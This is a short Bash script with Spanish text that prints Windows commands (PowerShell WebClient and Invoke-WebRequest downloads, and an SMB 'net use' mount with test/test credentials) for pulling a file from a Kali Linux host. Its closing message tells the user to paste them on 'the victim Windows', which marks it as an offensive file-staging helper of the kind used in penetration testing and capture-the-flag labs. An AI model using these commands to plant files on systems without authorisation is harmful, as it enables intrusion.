#!/bin/bash

# Colores (sin códigos de escape para los comandos a copiar)
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # Sin color

echo -e "${GREEN}\n[+] Herramienta de Transferencia de Archivos (Kali -> Windows)${NC}"

# Configuración inicial
read -p "Introduce la IP de tu Kali Linux: " KALI_IP
read -p "Ruta local del archivo a compartir (ej: /home/user/file.exe): " FILE_PATH
FILENAME=$(basename "$FILE_PATH")

# Menú de métodos
echo -e "\n${YELLOW}[?] Elige un método de transferencia:${NC}"
echo "1. HTTP/Web (Python server)"
echo "2. SMB (impacket-smbserver)"
echo "3. FTP (pyftpdlib)"
read -p "Opción (1-3): " METHOD

# Selección de puerto
if [ "$METHOD" -ne 2 ]; then
    read -p "Puerto personalizado (ej: 8080, 4444): " PORT
else
    PORT="445"
fi

# Generar comandos limpios (sin códigos de color)
generate_commands() {
    case $METHOD in
        1)
            echo -e "\n${GREEN}[+] Método Web (HTTP) seleccionado${NC}"
            echo -e "Ejecuta en Kali: ${YELLOW}sudo python3 -m http.server $PORT${NC}"
            echo -e "\nComandos para Windows (PowerShell):"
            echo " "
            echo "1. Descargar con Net.WebClient:"
            echo "(New-Object Net.WebClient).DownloadFile('http://${KALI_IP}:${PORT}/${FILENAME}', 'C:\\Users\\Public\\${FILENAME}')"
            echo " "
            echo "2. Descargar con Invoke-WebRequest:"
            echo "Invoke-WebRequest 'http://${KALI_IP}:${PORT}/${FILENAME}' -OutFile 'C:\\Users\\Public\\${FILENAME}'"
            ;;
        2)
            echo -e "\n${GREEN}[+] Método SMB seleccionado${NC}"
            echo -e "Ejecuta en Kali: ${YELLOW}sudo impacket-smbserver share -smb2support $(dirname "$FILE_PATH") -user test -password test${NC}"
            echo -e "\nComandos para Windows (CMD):"
            echo " "
            echo "1. Montar unidad:"
            echo "net use Z: \\\\${KALI_IP}\\share /user:test test"
            echo " "
            echo "2. Copiar archivo:"
            echo "copy Z:\\${FILENAME} C:\\Users\\Public\\${FILENAME}"
            echo " "
            echo "Para desmontar Z: utilice:" 
            echo "net use Z: /delete"
            ;;
        3)
            echo -e "\n${GREEN}[+] Método FTP seleccionado${NC}"
            echo -e "Ejecuta en Kali: ${YELLOW}sudo python3 -m pyftpdlib -p $PORT -w${NC}"
            echo -e "\nComandos para Windows (PowerShell):"
            echo "(New-Object Net.WebClient).DownloadFile('ftp://${KALI_IP}:${PORT}/${FILENAME}', 'C:\\Users\\Public\\${FILENAME}')"
            ;;
        *)
            echo -e "${RED}[-] Opción inválida${NC}"
            exit 1
            ;;
    esac
}

# Mostrar comandos sin colores para copiar/pegar
generate_commands | sed 's/\\033\[[0-9;]*m//g'  # Elimina códigos de color

echo -e "\n${GREEN}[+] ¡Listo! Copia los comandos sin color en el Windows victima.${NC}"